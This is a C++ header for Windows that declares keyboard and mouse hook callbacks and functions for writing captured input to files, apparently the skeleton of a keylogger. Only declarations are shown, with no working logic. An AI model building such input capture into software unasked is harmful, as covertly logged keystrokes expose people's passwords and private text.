#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <time.h>

using std::string;
using std::fstream;
using std::endl;
using std::ios;

CONST INT ERROR_HOOK_KEYBOARD = -1;
CONST INT ERROR_HOOK_MOUSE = -2;
CONST INT ERROR_OPEN_FILE_KEYBOARD = -3;
CONST INT ERROR_OPEN_FILE_MOUSE = -4;

bool open_file_for_keyboard(const char *name_file);
bool open_file_for_mouse(const char *name_file);
void close_file();
LRESULT CALLBACK hook_for_keyboard(int code, WPARAM wparam, LPARAM lparam);
LRESULT CALLBACK hook_for_mouse(int code, WPARAM wparam, LPARAM lparam);